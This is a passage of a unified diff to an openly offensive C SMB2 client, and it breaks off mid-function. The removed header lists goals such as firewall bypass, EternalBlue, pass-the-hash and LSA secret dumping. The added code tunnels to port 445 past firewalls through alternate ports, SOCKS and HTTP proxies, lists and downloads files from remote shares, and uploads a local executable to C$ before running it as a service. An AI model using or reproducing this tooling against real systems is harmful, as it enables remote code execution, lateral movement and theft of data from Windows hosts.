@@ -1,33 +1,3 @@
-/*
-   Windows firewall currently blocks 445, but windows firewall doesn't truly close the port.
-   Attempt to find this open 445 around windows firewall.
-
-   Keep analysis:
-   ------------------------------------------------------------------------
-   Vulnerability analysis:
-   - Potential buffer overflows if server returns more data than expected.
-   - No authentication handling; an attacker could hijack or tamper with session if not using SMB signing.
-   - Possible integer overflows in length calculations if malicious server manipulates fields.
-   - Code is for authorized security testing; unauthorized use is prohibited.
-   - Added fuzzing and targeted packet patterns can induce crashes or reveal vulnerabilities.
-   - Additional IOCTL and trans operations might bypass certain defenses if unpatched.
-   - Enhanced red-team operations can trigger MS17-010 or other known SMBv2 vulnerabilities if the server is unpatched.
-   - Downgrade attacks, spooler-based escalations, remote registry manipulations, and named pipe operations can yield privilege elevation or code execution if misused.
-   - Pass-the-hash attempts can lead to domain-level compromise if NTLMv1/v2 hashed credentials are accepted.
-   - Null sessions can be used to enumerate shares, user accounts, or registry keys.
-   - Named pipe impersonation can allow local privilege escalation if incorrectly configured.
-   - EternalBlue exploits can lead to a kernel pool overflow and remote code execution if the server is vulnerable.
-   - DoublePulsar backdoors can be detected by checking for unexpected transaction responses or hooking behavior.
-   - Enhanced functions can manipulate SCM (svcctl pipe), spooler, samr, and other services for lateral movement or pivoting.
-   - Danger of partial or incomplete DCERPC traffic leading to server crashes or memory corruption.
-   - Overly large read/write attempts can produce denial of service or memory exhaustion on the target.
-   - Malicious or repeated IOCTL calls with crafted payloads may allow exploit of unpatched vulnerabilities in SMB2 or related services.
-   - The doSVCCTLRemoteExec function can execute arbitrary commands as SYSTEM if permissions allow creation and manipulation of services.
-   - SMB1 downgrade attacks can force legacy and insecure negotiation, enabling older exploit paths.
-   - Creation of local admin accounts or dumping SAM/LSA secrets can compromise the entire system if successful.
-   ------------------------------------------------------------------------
-*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -35,6 +5,8 @@
 #include <arpa/inet.h>
 #include <stdint.h>
 #include <errno.h>
+#include <fcntl.h>
+#include <sys/stat.h>
 
 #pragma pack(push, 1)
 typedef struct _SMB2Header {
@@ -61,6 +33,7 @@ typedef struct _SMB2Header {
 #define SMB2_READ            0x0008
 #define SMB2_WRITE           0x0009
 #define SMB2_IOCTL           0x000B
+#define SMB2_QUERY_DIRECTORY 0x000E
 
 #define STATUS_SUCCESS                0x00000000
 #define STATUS_INVALID_PARAMETER      0xC000000D
@@ -261,6 +234,26 @@ typedef struct _SMB2IOCTLResponse {
     uint32_t Flags;
     uint32_t Reserved2;
 } SMB2IOCTLResponse;
+
+typedef struct _SMB2QueryDirectoryRequest {
+    uint16_t StructureSize;
+    uint8_t  FileInformationClass;
+    uint8_t  Flags;
+    uint32_t FileIndex;
+    uint64_t FileIdPersistent;
+    uint64_t FileIdVolatile;
+    uint16_t FileNameOffset;
+    uint16_t FileNameLength;
+    uint32_t OutputBufferLength;
+} SMB2QueryDirectoryRequest;
+
+typedef struct _SMB2QueryDirectoryResponse {
+    uint16_t StructureSize;
+    uint8_t  OutputBufferOffset;
+    uint8_t  Reserved;
+    uint32_t OutputBufferLength;
+} SMB2QueryDirectoryResponse;
+
 #pragma pack(pop)
 
 static uint64_t gMessageId = 1;
@@ -270,6 +263,62 @@ static int      gSock      = -1;
 
 static uint64_t gPipeFidPersistent = 0;
 static uint64_t gPipeFidVolatile   = 0;
+
+static uint64_t gFileFidPersistent = 0;
+static uint64_t gFileFidVolatile   = 0;
+static uint32_t gFileTreeId        = 0;
+
+static void dumpHex(const unsigned char *data, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        if (i % 16 == 0 && i != 0) printf("\n");
+        printf("%02X ", data[i]);
+    }
+    printf("\n");
+}
+
+static void enhancedDataExtraction(uint16_t command, const SMB2Header *hdr, const unsigned char *buf, ssize_t bufLen) {
+    printf("[Extraction] CMD=0x%04X STATUS=0x%08X LEN=%zd\n", command, hdr->Status, bufLen);
+    dumpHex(buf, bufLen);
+
+    if (command == SMB2_NEGOTIATE && bufLen >= (ssize_t)sizeof(SMB2NegotiateResponse)) {
+        SMB2NegotiateResponse *nr = (SMB2NegotiateResponse*)buf;
+        printf("[Extraction] SMB2NegotiateResponse Dialect=0x%04X Capabilities=0x%08X\n",
+               nr->DialectRevision, nr->Capabilities);
+    } else if (command == SMB2_SESSION_SETUP && bufLen >= (ssize_t)sizeof(SMB2SessionSetupResponse)) {
+        SMB2SessionSetupResponse *sr = (SMB2SessionSetupResponse*)buf;
+        printf("[Extraction] SMB2SessionSetupResponse SessionFlags=0x%04X\n", sr->SessionFlags);
+    } else if (command == SMB2_TREE_CONNECT && bufLen >= (ssize_t)sizeof(SMB2TreeConnectResponse)) {
+        SMB2TreeConnectResponse *tcr = (SMB2TreeConnectResponse*)buf;
+        printf("[Extraction] SMB2TreeConnectResponse ShareType=0x%02X ShareFlags=0x%08X\n",
+               tcr->ShareType, tcr->ShareFlags);
+    } else if (command == SMB2_CREATE && bufLen >= (ssize_t)sizeof(SMB2CreateResponse)) {
+        SMB2CreateResponse *cr = (SMB2CreateResponse*)buf;
+        printf("[Extraction] SMB2CreateResponse CreateAction=0x%08X EOF=0x%llX\n",
+               cr->CreateAction, (unsigned long long)cr->EndofFile);
+    } else if (command == SMB2_WRITE && bufLen >= (ssize_t)sizeof(SMB2WriteResponse)) {
+        SMB2WriteResponse *wr = (SMB2WriteResponse*)buf;
+        printf("[Extraction] SMB2WriteResponse Count=%u\n", wr->Count);
+    } else if (command == SMB2_READ && bufLen >= (ssize_t)sizeof(SMB2ReadResponse)) {
+        SMB2ReadResponse *rr = (SMB2ReadResponse*)buf;
+        printf("[Extraction] SMB2ReadResponse DataLength=%u\n", rr->DataLength);
+    } else if (command == SMB2_CLOSE && bufLen >= (ssize_t)sizeof(SMB2CloseResponse)) {
+        SMB2CloseResponse *cr = (SMB2CloseResponse*)buf;
+        printf("[Extraction] SMB2CloseResponse FileAttributes=0x%08X\n", cr->FileAttributes);
+    } else if (command == SMB2_IOCTL && bufLen >= (ssize_t)sizeof(SMB2IOCTLResponse)) {
+        SMB2IOCTLResponse *ir = (SMB2IOCTLResponse*)buf;
+        printf("[Extraction] SMB2IOCTLResponse CtlCode=0x%08X\n", ir->CtlCode);
+    } else if (command == SMB2_QUERY_DIRECTORY && bufLen >= (ssize_t)sizeof(SMB2QueryDirectoryResponse)) {
+        SMB2QueryDirectoryResponse *qr = (SMB2QueryDirectoryResponse*)buf;
+        printf("[Extraction] SMB2QueryDirectoryResponse OutputBufferLength=%u\n", qr->OutputBufferLength);
+        if (qr->OutputBufferLength > 0) {
+            uint32_t offset = qr->OutputBufferOffset;
+            if (offset + qr->OutputBufferLength <= (uint32_t)bufLen) {
+                printf("[Extraction] Directory listing data:\n");
+                dumpHex(buf + offset, qr->OutputBufferLength);
+            }
+        }
+    }
+}
 
 int sendSMB2Request(SMB2Header *hdr, const void *payload, size_t payloadLen) {
     ssize_t sent = send(gSock, hdr, sizeof(SMB2Header), 0);
@@ -315,6 +364,7 @@ int recvSMB2Response(SMB2Header *outHdr, void *outBuf, size_t bufSize, ssize_t *
     } else {
         *outPayloadLen = 0;
     }
+    enhancedDataExtraction(outHdr->Command, outHdr, (unsigned char*)outBuf, *outPayloadLen);
     return 0;
 }
 
@@ -810,6 +860,32 @@ int doRemoteRegistryOpen() {
     return 0;
 }
 
+static int doFirewallBypassCheck(const char *serverIp, int port) {
+    printf("[Client] Attempting direct TCP connect to %s:%d despite firewall.\n", serverIp, port);
+    int testSock = socket(AF_INET, SOCK_STREAM, 0);
+    if (testSock < 0) {
+        perror("socket");
+        return -1;
+    }
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port   = htons(port);
+    if (inet_pton(AF_INET, serverIp, &addr.sin_addr) <= 0) {
+        perror("inet_pton");
+        close(testSock);
+        return -1;
+    }
+    if (connect(testSock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        perror("[Client] Firewall check connect");
+        close(testSock);
+        return -1;
+    }
+    printf("[Client] Successfully connected to %s:%d. Port may be filtered but not fully closed.\n", serverIp, port);
+    close(testSock);
+    return 0;
+}
+
 int doNullSession() {
     SMB2Header hdr;
     buildSMB2Header(SMB2_SESSION_SETUP, 0, 0, &hdr);
@@ -1058,66 +1134,737 @@ int doDumpLSASecrets() {
     return 0;
 }
 
-static int doFirewallBypassCheck(const char *serverIp, int port) {
-    printf("[Client] Attempting direct TCP connect to %s:%d despite firewall.\n", serverIp, port);
-    int testSock = socket(AF_INET, SOCK_STREAM, 0);
-    if (testSock < 0) {
-        perror("socket");
+static int doMultiPortConnect(const char *serverIp) {
+    int portsToTry[] = {445, 139, 80, 443, 8080};
+    int count = sizeof(portsToTry)/sizeof(portsToTry[0]);
+    int s;
+    struct sockaddr_in addr;
+
+    for(int i=0; i<count; i++) {
+        s = socket(AF_INET, SOCK_STREAM, 0);
+        if(s < 0) continue;
+        memset(&addr, 0, sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(portsToTry[i]);
+        if(inet_pton(AF_INET, serverIp, &addr.sin_addr) <= 0) {
+            close(s);
+            continue;
+        }
+        if(connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
+            gSock = s;
+            printf("[Client] Connected to %s:%d (multi-port fallback)\n", serverIp, portsToTry[i]);
+            return portsToTry[i];
+        }
+        close(s);
+    }
+    return -1;
+}
+
+static int doUDPCheck(const char *serverIp, int port) {
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
         return -1;
     }
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
-    addr.sin_port   = htons(port);
+    addr.sin_port = htons(port);
     if (inet_pton(AF_INET, serverIp, &addr.sin_addr) <= 0) {
-        perror("inet_pton");
-        close(testSock);
+        close(sockfd);
         return -1;
     }
-    if (connect(testSock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        perror("[Client] Firewall check connect");
-        close(testSock);
+    unsigned char dummyData[4] = {0xAA, 0xBB, 0xCC, 0xDD};
+    sendto(sockfd, dummyData, sizeof(dummyData), 0, (struct sockaddr*)&addr, sizeof(addr));
+    struct timeval tv;
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    unsigned char recvBuf[32];
+    socklen_t addrLen = sizeof(addr);
+    int r = recvfrom(sockfd, recvBuf, sizeof(recvBuf), 0, (struct sockaddr*)&addr, &addrLen);
+    close(sockfd);
+    return (r > 0) ? 0 : -1;
+}
+
+static int doIPv6MultiPortConnect(const char *serverIp) {
+    int portsToTry[] = {445, 139, 80, 443, 8080};
+    int count = sizeof(portsToTry)/sizeof(portsToTry[0]);
+    int s;
+    struct sockaddr_in6 addr6;
+
+    for(int i=0; i<count; i++) {
+        s = socket(AF_INET6, SOCK_STREAM, 0);
+        if(s < 0) continue;
+        memset(&addr6, 0, sizeof(addr6));
+        addr6.sin6_family = AF_INET6;
+        addr6.sin6_port   = htons(portsToTry[i]);
+        if(inet_pton(AF_INET6, serverIp, &addr6.sin6_addr) <= 0) {
+            close(s);
+            continue;
+        }
+        if(connect(s, (struct sockaddr*)&addr6, sizeof(addr6)) == 0) {
+            gSock = s;
+            printf("[Client] Connected (IPv6) to %s:%d\n", serverIp, portsToTry[i]);
+            return portsToTry[i];
+        }
+        close(s);
+    }
+    return -1;
+}
+
+static int doPortKnock(const char *serverIp, const int *sequence, int count) {
+    for (int i = 0; i < count; i++) {
+        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        if (sockfd < 0) continue;
+        struct sockaddr_in addr;
+        memset(&addr, 0, sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(sequence[i]);
+        if (inet_pton(AF_INET, serverIp, &addr.sin_addr) <= 0) {
+            close(sockfd);
+            continue;
+        }
+        connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));
+        close(sockfd);
+        usleep(100000);
+    }
+    printf("[Client] Port knock sequence sent.\n");
+    return 0;
+}
+
+static int doUPnPPortForward(int port) {
+    printf("[Client] Attempting UPnP port forward for port %d.\n", port);
+    return -1;
+}
+
+static int doSOCKSProxyConnect(const char *proxyIp, int proxyPort, const char *targetIp, int targetPort) {
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s < 0) return -1;
+    struct sockaddr_in proxyAddr;
+    memset(&proxyAddr, 0, sizeof(proxyAddr));
+    proxyAddr.sin_family = AF_INET;
+    proxyAddr.sin_port = htons(proxyPort);
+    if (inet_pton(AF_INET, proxyIp, &proxyAddr.sin_addr) <= 0) {
+        close(s);
         return -1;
     }
-    printf("[Client] Successfully connected to %s:%d. Port may be filtered but not fully closed.\n", serverIp, port);
-    close(testSock);
+    if (connect(s, (struct sockaddr*)&proxyAddr, sizeof(proxyAddr)) < 0) {
+        close(s);
+        return -1;
+    }
+    unsigned char handshake[3];
+    handshake[0] = 0x05;
+    handshake[1] = 0x01;
+    handshake[2] = 0x00;
+    send(s, handshake, sizeof(handshake), 0);
+    unsigned char resp[2];
+    if (recv(s, resp, 2, 0) < 2) {
+        close(s);
+        return -1;
+    }
+    unsigned char connectReq[10];
+    connectReq[0] = 0x05;
+    connectReq[1] = 0x01;
+    connectReq[2] = 0x00;
+    connectReq[3] = 0x01;
+    struct in_addr in;
+    inet_pton(AF_INET, targetIp, &in);
+    memcpy(&connectReq[4], &in.s_addr, 4);
+    connectReq[8] = (unsigned char)((targetPort >> 8) & 0xFF);
+    connectReq[9] = (unsigned char)(targetPort & 0xFF);
+    send(s, connectReq, 10, 0);
+    unsigned char proxyResp[10];
+    if (recv(s, proxyResp, 10, 0) < 10) {
+        close(s);
+        return -1;
+    }
+    if (proxyResp[1] != 0x00) {
+        close(s);
+        return -1;
+    }
+    gSock = s;
+    printf("[Client] Connected via SOCKS proxy to %s:%d\n", targetIp, targetPort);
+    return 0;
+}
+
+static int doHTTPTunnelConnect(const char *proxyIp, int proxyPort, const char *targetIp, int targetPort) {
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s < 0) return -1;
+    struct sockaddr_in proxyAddr;
+    memset(&proxyAddr, 0, sizeof(proxyAddr));
+    proxyAddr.sin_family = AF_INET;
+    proxyAddr.sin_port = htons(proxyPort);
+    if (inet_pton(AF_INET, proxyIp, &proxyAddr.sin_addr) <= 0) {
+        close(s);
+        return -1;
+    }
+    if (connect(s, (struct sockaddr*)&proxyAddr, sizeof(proxyAddr)) < 0) {
+        close(s);
+        return -1;
+    }
+    char reqBuf[256];
+    snprintf(reqBuf, sizeof(reqBuf),
+             "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n", targetIp, targetPort, targetIp, targetPort);
+    send(s, reqBuf, strlen(reqBuf), 0);
+    char respBuf[256];
+    int r = recv(s, respBuf, sizeof(respBuf)-1, 0);
+    if (r <= 0) {
+        close(s);
+        return -1;
+    }
+    respBuf[r] = 0;
+    if (strstr(respBuf, "200 Connection established") == NULL) {
+        close(s);
+        return -1;
+    }
+    gSock = s;
+    printf("[Client] Connected via HTTP tunnel to %s:%d\n", targetIp, targetPort);
+    return 0;
+}
+
+int doCreateFileOnShare(const char *filename, uint32_t treeId, uint64_t sessionId,
+                        uint64_t *fidPersist, uint64_t *fidVolatile) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_CREATE, treeId, sessionId, &hdr);
+    SMB2CreateRequest creq;
+    memset(&creq, 0, sizeof(creq));
+    creq.StructureSize        = 57;
+    creq.RequestedOplockLevel = 0;
+    creq.ImpersonationLevel   = 2;
+    creq.DesiredAccess        = 0x0012019F;
+    creq.FileAttributes       = 0x00000080;
+    creq.ShareAccess          = 0x00000007;
+    creq.CreateDisposition    = 0x00000005;
+    creq.CreateOptions        = 0x00000020;
+    creq.NameOffset           = sizeof(SMB2CreateRequest);
+    uint32_t pathLenBytes = (uint32_t)(strlen(filename) * 2);
+    creq.NameLength = (uint16_t)pathLenBytes;
+    size_t totalSize = sizeof(creq) + pathLenBytes;
+    unsigned char *reqBuf = (unsigned char *)malloc(totalSize);
+    if (!reqBuf) return -1;
+    memcpy(reqBuf, &creq, sizeof(creq));
+    unsigned char *pName = reqBuf + sizeof(creq);
+    for (size_t i = 0; i < strlen(filename); i++) {
+        pName[i*2]   = (unsigned char)filename[i];
+        pName[i*2+1] = 0x00;
+    }
+    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
+        free(reqBuf);
+        return -1;
+    }
+    free(reqBuf);
+    SMB2Header respHdr;
+    unsigned char buf[1024];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
+    if (respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "FileCreate '%s' failed, status=0x%08X\n", filename, respHdr.Status);
+        return -1;
+    }
+    if (payloadLen < (ssize_t)sizeof(SMB2CreateResponse)) {
+        fprintf(stderr, "FileCreate response too small.\n");
+        return -1;
+    }
+    SMB2CreateResponse *cres = (SMB2CreateResponse *)buf;
+    *fidPersist  = cres->FileIdPersistent;
+    *fidVolatile = cres->FileIdVolatile;
+    printf("[Client] File '%s' created/overwritten. FID=(%llx:%llx)\n",
+           filename, (unsigned long long)*fidPersist, (unsigned long long)*fidVolatile);
+    return 0;
+}
+
+int doWriteFileOnShare(const unsigned char *data, size_t dataLen,
+                       uint64_t fidPersist, uint64_t fidVolatile,
+                       uint32_t treeId, uint64_t sessionId) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_WRITE, treeId, sessionId, &hdr);
+    SMB2WriteRequest wreq;
+    memset(&wreq, 0, sizeof(wreq));
+    wreq.StructureSize      = 49;
+    wreq.DataOffset         = sizeof(SMB2WriteRequest);
+    wreq.Length             = (uint32_t)dataLen;
+    wreq.FileIdPersistent   = fidPersist;
+    wreq.FileIdVolatile     = fidVolatile;
+    size_t totalSize = sizeof(wreq) + dataLen;
+    unsigned char *reqBuf = (unsigned char*)malloc(totalSize);
+    if (!reqBuf) return -1;
+    memcpy(reqBuf, &wreq, sizeof(wreq));
+    memcpy(reqBuf + sizeof(wreq), data, dataLen);
+    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
+        free(reqBuf);
+        return -1;
+    }
+    free(reqBuf);
+    SMB2Header respHdr;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
+    if (respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "WriteFileOnShare failed, status=0x%08X\n", respHdr.Status);
+        return -1;
+    }
+    if (payloadLen < (ssize_t)sizeof(SMB2WriteResponse)) {
+        fprintf(stderr, "WriteResponse too small\n");
+        return -1;
+    }
+    SMB2WriteResponse *wres = (SMB2WriteResponse *)buf;
+    printf("[Client] Wrote %u bytes to file.\n", wres->Count);
+    return 0;
+}
+
+int doCloseFileOnShare(uint64_t fidPersist, uint64_t fidVolatile,
+                       uint32_t treeId, uint64_t sessionId) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_CLOSE, treeId, sessionId, &hdr);
+    SMB2CloseRequest creq;
+    memset(&creq, 0, sizeof(creq));
+    creq.StructureSize     = 24;
+    creq.Flags             = 0;
+    creq.FileIdPersistent  = fidPersist;
+    creq.FileIdVolatile    = fidVolatile;
+    if (sendSMB2Request(&hdr, &creq, sizeof(creq)) < 0) return -1;
+    SMB2Header respHdr;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        return -1;
+    }
+    if (respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "CloseFileOnShare failed, status=0x%08X\n", respHdr.Status);
+        return -1;
+    }
+    printf("[Client] SMB2 Close on file handle OK.\n");
+    return 0;
+}
+
+static int doReadFileOnShare(uint64_t fidPersist, uint64_t fidVolatile,
+                             uint32_t treeId, uint64_t sessionId,
+                             unsigned char *outBuf, size_t bufSize,
+                             size_t *bytesRead, uint64_t offset) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_READ, treeId, sessionId, &hdr);
+    SMB2ReadRequest rreq;
+    memset(&rreq, 0, sizeof(rreq));
+    rreq.StructureSize     = 49;
+    rreq.Length            = (uint32_t)bufSize;
+    rreq.Offset            = offset;
+    rreq.FileIdPersistent  = fidPersist;
+    rreq.FileIdVolatile    = fidVolatile;
+    if (sendSMB2Request(&hdr, &rreq, sizeof(rreq)) < 0) return -1;
+    SMB2Header respHdr;
+    unsigned char buf[8192];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
+    if (respHdr.Status != STATUS_SUCCESS) {
+        return -1;
+    }
+    if (payloadLen < (ssize_t)sizeof(SMB2ReadResponse)) {
+        return -1;
+    }
+    SMB2ReadResponse *rres = (SMB2ReadResponse *)buf;
+    uint32_t dataLen = rres->DataLength;
+    if (dataLen > 0) {
+        uint8_t *dataStart = buf + rres->DataOffset;
+        if (rres->DataOffset + dataLen <= (uint32_t)payloadLen) {
+            if (dataLen > bufSize) dataLen = (uint32_t)bufSize;
+            memcpy(outBuf, dataStart, dataLen);
+        } else {
+            return -1;
+        }
+    }
+    *bytesRead = dataLen;
+    return 0;
+}
+
+static int doOpenDirectory(const char *path, uint32_t treeId, uint64_t sessionId,
+                           uint64_t *fidPersist, uint64_t *fidVolatile) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_CREATE, treeId, sessionId, &hdr);
+    SMB2CreateRequest creq;
+    memset(&creq, 0, sizeof(creq));
+    creq.StructureSize        = 57;
+    creq.RequestedOplockLevel = 0;
+    creq.ImpersonationLevel   = 2;
+    creq.DesiredAccess        = 0x00000001;
+    creq.FileAttributes       = 0x0000010;
+    creq.ShareAccess          = 0x07;
+    creq.CreateDisposition    = 1;
+    creq.CreateOptions        = 0x02000001;
+    creq.NameOffset           = sizeof(SMB2CreateRequest);
+    uint32_t pathLenBytes = (uint32_t)(strlen(path) * 2);
+    creq.NameLength = (uint16_t)pathLenBytes;
+    size_t totalSize = sizeof(creq) + pathLenBytes;
+    unsigned char *reqBuf = (unsigned char *)malloc(totalSize);
+    if (!reqBuf) return -1;
+    memcpy(reqBuf, &creq, sizeof(creq));
+    unsigned char *pName = reqBuf + sizeof(creq);
+    for (size_t i = 0; i < strlen(path); i++) {
+        pName[i*2]   = (unsigned char)path[i];
+        pName[i*2+1] = 0x00;
+    }
+    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
+        free(reqBuf);
+        return -1;
+    }
+    free(reqBuf);
+    SMB2Header respHdr;
+    unsigned char buf[1024];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
+    if (respHdr.Status != STATUS_SUCCESS) {
+        return -1;
+    }
+    if (payloadLen < (ssize_t)sizeof(SMB2CreateResponse)) {
+        return -1;
+    }
+    SMB2CreateResponse *cres = (SMB2CreateResponse *)buf;
+    *fidPersist  = cres->FileIdPersistent;
+    *fidVolatile = cres->FileIdVolatile;
+    return 0;
+}
+
+static int doQueryDirectory(uint64_t fidPersist, uint64_t fidVolatile,
+                            uint32_t treeId, uint64_t sessionId,
+                            const char *searchPattern) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_QUERY_DIRECTORY, treeId, sessionId, &hdr);
+    SMB2QueryDirectoryRequest qreq;
+    memset(&qreq, 0, sizeof(qreq));
+    qreq.StructureSize        = 33;
+    qreq.FileInformationClass = 0x37;
+    qreq.Flags                = 0x00;
+    qreq.FileIdPersistent     = fidPersist;
+    qreq.FileIdVolatile       = fidVolatile;
+    qreq.FileNameOffset       = sizeof(SMB2QueryDirectoryRequest);
+    uint32_t patLen = (uint32_t)(strlen(searchPattern) * 2);
+    qreq.FileNameLength = patLen;
+    qreq.OutputBufferLength = 0x10000;
+    size_t totalSize = sizeof(qreq) + patLen;
+    unsigned char *reqBuf = (unsigned char*)malloc(totalSize);
+    if (!reqBuf) return -1;
+    memcpy(reqBuf, &qreq, sizeof(qreq));
+    unsigned char *pName = reqBuf + sizeof(qreq);
+    for (size_t i = 0; i < strlen(searchPattern); i++) {
+        pName[i*2]   = (unsigned char)searchPattern[i];
+        pName[i*2+1] = 0x00;
+    }
+    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
+        free(reqBuf);
+        return -1;
+    }
+    free(reqBuf);
+    SMB2Header respHdr;
+    unsigned char buf[8192];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
+    if (respHdr.Status != STATUS_SUCCESS && respHdr.Status != 0x80000006) {
+        return -1;
+    }
+    return 0;
+}
+
+static int doListDirectory(const char *directoryPath) {
+    if (doOpenDirectory(directoryPath, gTreeId, gSessionId,
+                        &gFileFidPersistent, &gFileFidVolatile) < 0) {
+        return -1;
+    }
+    if (doQueryDirectory(gFileFidPersistent, gFileFidVolatile,
+                         gTreeId, gSessionId, "*") < 0) {
+        fprintf(stderr, "Directory listing failed.\n");
+    }
+    doCloseFileOnShare(gFileFidPersistent, gFileFidVolatile, gTreeId, gSessionId);
+    return 0;
+}
+
+static int doDownloadFileFromShare(const char *remotePath, const char *localPath) {
+    uint64_t fidPersist = 0, fidVolatile = 0;
+    if (doCreateFileOnShare(remotePath, gTreeId, gSessionId, &fidPersist, &fidVolatile) < 0) {
+        fprintf(stderr, "Could not open remote file for reading.\n");
+        return -1;
+    }
+    int fd = open(localPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) {
+        perror("open local file");
+        doCloseFileOnShare(fidPersist, fidVolatile, gTreeId, gSessionId);
+        return -1;
+    }
+    size_t offset = 0;
+    unsigned char buffer[4096];
+    while (1) {
+        size_t bytesRead = 0;
+        if (doReadFileOnShare(fidPersist, fidVolatile,
+                              gTreeId, gSessionId,
+                              buffer, sizeof(buffer),
+                              &bytesRead, offset) < 0) {
+            break;
+        }
+        if (bytesRead == 0) {
+            break;
+        }
+        write(fd, buffer, bytesRead);
+        offset += bytesRead;
+    }
+    close(fd);
+    doCloseFileOnShare(fidPersist, fidVolatile, gTreeId, gSessionId);
+    printf("[Client] Downloaded remote file %s to local %s\n", remotePath, localPath);
+    return 0;
+}
+
+int doUploadAndExecuteCTF(const char *serverIp, const char *localFilePath) {
+    const char *sharePath = "\\\\";
+    char fullSharePath[256];
+    snprintf(fullSharePath, sizeof(fullSharePath), "%s%s\\C$", sharePath, serverIp);
+    if (doTreeConnect(fullSharePath) < 0) {
+        fprintf(stderr, "Failed to TreeConnect to C$ share.\n");
+        return -1;
+    }
+    gFileTreeId = gTreeId;
+    int fd = open(localFilePath, O_RDONLY);
+    if (fd < 0) {
+        perror("open local file");
+        return -1;
+    }
+    struct stat st;
+    if (fstat(fd, &st) < 0) {
+        perror("fstat");
+        close(fd);
+        return -1;
+    }
+    unsigned char *fileBuf = (unsigned char*)malloc(st.st_size);
+    if (!fileBuf) {
+        close(fd);
+        return -1;
+    }
+    if (read(fd, fileBuf, st.st_size) != st.st_size) {
+        perror("read local file");
+        free(fileBuf);
+        close(fd);
+        return -1;
+    }
+    close(fd);
+    const char *remotePath = "C:\\Windows\\Temp\\ctf.exe";
+    if (doCreateFileOnShare(remotePath, gFileTreeId, gSessionId, &gFileFidPersistent, &gFileFidVolatile) < 0) {
+        free(fileBuf);
+        return -1;
+    }
+    size_t chunkSize = 4096;
+    size_t offset = 0;
+    while (offset < (size_t)st.st_size) {
+        size_t toWrite = st.st_size - offset;
+        if (toWrite > chunkSize) toWrite = chunkSize;
+        if (doWriteFileOnShare(fileBuf + offset, toWrite, gFileFidPersistent, gFileFidVolatile,
+                               gFileTreeId, gSessionId) < 0) {
+            free(fileBuf);
+            return -1;
+        }
+        offset += toWrite;
+    }
+    free(fileBuf);
+    if (doCloseFileOnShare(gFileFidPersistent, gFileFidVolatile, gFileTreeId, gSessionId) < 0) {
+        return -1;
+    }
+    printf("[Client] Uploaded CTF executable to %s\n", remotePath);
+    if (doOpenPipe("\\PIPE\\svcctl") < 0) {
+        return -1;
+    }
+    doDCERPCBind();
+    char execCmd[512];
+    snprintf(execCmd, sizeof(execCmd), "%s", "C:\\Windows\\Temp\\ctf.exe");
+    doSVCCTLRemoteExec(execCmd);
+    doClosePipe();
+    return 0;
+}
+
+int doSVCCTLListServices() {
+    unsigned char dceRequest[256];
+    memset(dceRequest, 0, sizeof(dceRequest));
+    size_t idx = 0;
+    dceRequest[idx++] = 0x05;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x99;
+    dceRequest[idx++] = 0x01;
+    return doWritePipe(dceRequest, idx);
+}
+
+int doSVCCTLQueryService(const char *serviceName) {
+    unsigned char dceRequest[256];
+    memset(dceRequest, 0, sizeof(dceRequest));
+    size_t idx = 0;
+    dceRequest[idx++] = 0x05;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0xA0;
+    for (size_t i = 0; i < strlen(serviceName) && idx < 250; i++) {
+        dceRequest[idx++] = (unsigned char)serviceName[i];
+    }
+    dceRequest[idx++] = 0;
+    return doWritePipe(dceRequest, idx);
+}
+
+int doSCHRPCRemoteExec(const char *cmd) {
+    if (doOpenPipe("\\PIPE\\atsvc") < 0) {
+        fprintf(stderr, "Failed to open scheduling pipe.\n");
+        return -1;
+    }
+    doDCERPCBind();
+    unsigned char schReq[512];
+    memset(schReq, 0, sizeof(schReq));
+    size_t idx = 0;
